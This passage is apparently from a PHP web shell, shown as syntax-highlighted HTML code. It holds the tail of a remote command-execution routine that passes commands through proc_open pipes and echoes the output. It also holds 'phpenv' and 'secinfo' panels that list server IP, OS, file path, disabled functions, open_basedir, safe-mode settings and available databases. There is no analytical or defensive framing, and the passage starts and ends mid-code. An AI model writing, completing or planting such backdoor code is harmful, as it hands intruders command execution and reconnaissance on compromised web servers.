#cccccc; background-color: #2d2d2d;\">0<\/span>], <span style=\"color: #66cccc;\">\"exit\\r\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> (!<span style=\"color: #cccccc; background-color: #2d2d2d;\">feof(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>])) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">fgets(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>], <span style=\"color: #cccccc; background-color: #2d2d2d;\">1024<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> (!<span style=\"color: #cccccc; background-color: #2d2d2d;\">feof(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>])) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">fgets(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>], <span style=\"color: #cccccc; background-color: #2d2d2d;\">1024<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">pipes<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">proc_close(<\/span>$<span style=\"color: #ffcc66;\">process<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span>$<span style=\"color: #ffcc66;\">command<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/pre&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end shell<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'phpenv'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">upsize<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'file_uploads'<\/span>) ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'upload_max_filesize'<\/span>) : <span style=\"color: #66cccc;\">'Not allowe<\/span><span style=\"color: #66cccc; text-decoration: underline;\">d'<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">adminmail<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SERVER_ADMIN'<\/span>]) ? $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SERVER_ADMIN'<\/span>] : <span style=\"color: #cccccc; background-color: #2d2d2d;\">getc<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">fg(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'sendmail_from'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">dis_func<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dis_func<\/span> = <span style=\"color: #66cccc;\">'No'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\">     <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">info<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Server Time'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">date(<\/span><span style=\"color: #66cccc;\">'Y\/m\/d h:i:s'<\/span>,$<span style=\"color: #ffcc66;\">timestamp<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Server Domain'<\/span>,$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SERVER_NAME'<\/span>]),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">3<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Server IP'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">gethostbyname(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SERVER_NAME'<\/span>])),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">4<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Server OS'<\/span>,<span style=\"color: #6699cc;\">PHP_OS<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">5<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Server OS Charset'<\/span>,$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_ACCEPT_LANGUAGE'<\/span>]),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">6<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Server Software'<\/span>,$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SERVER_SOFTWARE'<\/span>]),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">7<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Server Web Port'<\/span>,$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SERVER_PORT'<\/span>]),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">8<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'PHP run mode'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">strtoupper(php_sapi_name(<\/span>))),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">9<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'The file path'<\/span>,<span style=\"color: #6699cc;\">__FILE__<\/span>),\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">10<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'PHP Version'<\/span>,<span style=\"color: #6699cc;\">PHP_VERSION<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">11<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'PHPINFO'<\/span>,(<span style=\"color: #f2777a; font-weight: bold;\">IS_PHPINFO<\/span> ? <span style=\"color: #66cccc;\">'&lt;a href=\"javascript:g(\\'phpinfo\\');<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"&gt;Yes&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'No'<\/span><span style=\"text-decoration: underline;\">)),<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">12<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Safe Mode'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'safe_mode'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">13<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Administrator'<\/span>,$<span style=\"color: #ffcc66;\">adminmail<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">14<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'allow_url_fopen'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'allow_url_fopen'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">15<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'enable_dl'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'enable_dl'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">16<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'display_errors'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'display_errors'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">17<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'register_globals'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'register_globals'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">18<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'magic_quotes_gpc'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'magic_quotes_gpc'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">19<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'memory_limit'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'memory_limit'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">20<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'post_max_size'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'post_max_size'<\/span>)),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">21<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'upload_max_filesize'<\/span>,$<span style=\"color: #ffcc66;\">upsize<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">22<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'max_execution_time'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span><span style=\"color: #66cccc;\">'max_execution_time'<\/span>).<span style=\"color: #66cccc;\">' second(s<\/span><span style=\"color: #66cccc; text-decoration: underline;\">)'<\/span><span style=\"text-decoration: underline;\">),<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">23<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'disable_functions'<\/span>,$<span style=\"color: #ffcc66;\">dis_func<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   );\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">phpvarname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span>$<span style=\"color: #ffcc66;\">phpvarname<\/span> .<span style=\"color: #66cccc;\">' : '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">getcfg(<\/span>$<span style=\"color: #ffcc66;\">phpvarname<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Server environment'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'phpenv'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Please input PHP configuration parameter(eg:magic_<\/span><span style=\"color: #66cccc; text-decoration: underline;\">quotes_gpc)'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'name'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'phpvarname'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'value'<\/span><span style=\"text-decoration: underline;\">=&gt;$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">phpvarname<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfooter(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">hp<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(0<\/span>=&gt; <span style=\"color: #66cccc;\">'Server'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>=&gt; <span style=\"color: #66cccc;\">'PHP'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">a<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;$<span style=\"color: #ffcc66;\">a<\/span>&lt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>;$<span style=\"color: #ffcc66;\">a<\/span>++) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;'<\/span>.$<span style=\"color: #ffcc66;\">hp<\/span>[$<span style=\"color: #ffcc66;\">a<\/span>].<span style=\"color: #66cccc;\">' &amp;raquo;&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;ul class=\"info\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">a<\/span>==<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">i<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>&lt;=<span style=\"color: #cccccc; background-color: #2d2d2d;\">9<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>++) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;li&gt;&lt;u&gt;'<\/span>.$<span style=\"color: #ffcc66;\">info<\/span>[$<span style=\"color: #ffcc66;\">i<\/span>][<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>].<span style=\"color: #66cccc;\">':&lt;\/u&gt;'<\/span>.$<span style=\"color: #ffcc66;\">info<\/span>[$<span style=\"color: #ffcc66;\">i<\/span>][<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>].<span style=\"color: #66cccc;\">'&lt;\/li&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">a<\/span> == <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">i<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">10<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>&lt;=<span style=\"color: #cccccc; background-color: #2d2d2d;\">23<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>++) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;li&gt;&lt;u&gt;'<\/span>.$<span style=\"color: #ffcc66;\">info<\/span>[$<span style=\"color: #ffcc66;\">i<\/span>][<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>].<span style=\"color: #66cccc;\">':&lt;\/u&gt;'<\/span>.$<span style=\"color: #ffcc66;\">info<\/span>[$<span style=\"color: #ffcc66;\">i<\/span>][<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>].<span style=\"color: #66cccc;\">'&lt;\/li&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/ul&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end phpenv<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'secinfo'<\/span>) {\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Server software'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">getenv(<\/span><span style=\"color: #66cccc;\">'SERVER_SOFTWARE'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Disabled PHP Functions'<\/span>, ($<span style=\"color: #6699cc;\">GLOBALS<\/span>[<span style=\"color: #66cccc;\">'disable_functions'<\/span>])?$<span style=\"color: #6699cc;\">GLOBALS<\/span>[<span style=\"color: #66cccc; text-decoration: underline;\">'disable_functions'<\/span><span style=\"text-decoration: underline;\">]:<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'none'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Open base dir'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ini_get(<\/span><span style=\"color: #66cccc;\">'open_basedir'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Safe mode exec dir'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ini_get(<\/span><span style=\"color: #66cccc;\">'safe_mode_exec_dir'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Safe mode include dir'<\/span>, @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ini_get(<\/span><span style=\"color: #66cccc;\">'safe_mode_include_dir'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'cURL support'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'curl_version'<\/span>)?<span style=\"color: #66cccc;\">'enabled'<\/span>:<span style=\"color: #66cccc;\">'no'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'mysql_get_client_info'<\/span>))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>[] = <span style=\"color: #66cccc;\">\"MySql (\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_get_client_info(<\/span>).<span style=\"color: #66cccc;\">\")\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'mssql_connect'<\/span>))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>[] = <span style=\"color: #66cccc;\">\"MSSQL\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'pg_connect'<\/span>))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>[] = <span style=\"color: #66cccc;\">\"PostgreSQL\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'oci_connect'<\/span>))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">temp<\/span>[] = <span style=\"color: #66cccc;\">\"Oracle\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">secparam(<\/span><span style=\"color: #66cccc;\">'Supported databases'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">implode(<\/span><span style=\"color: #66cccc;\">', '<\/span>, $<span style=\"color: #ffcc66;\">temp<\/span>));\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>( !<span style=\"color: #f2777a; font-weight: bold;\">IS_WIN<\/span> ) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: 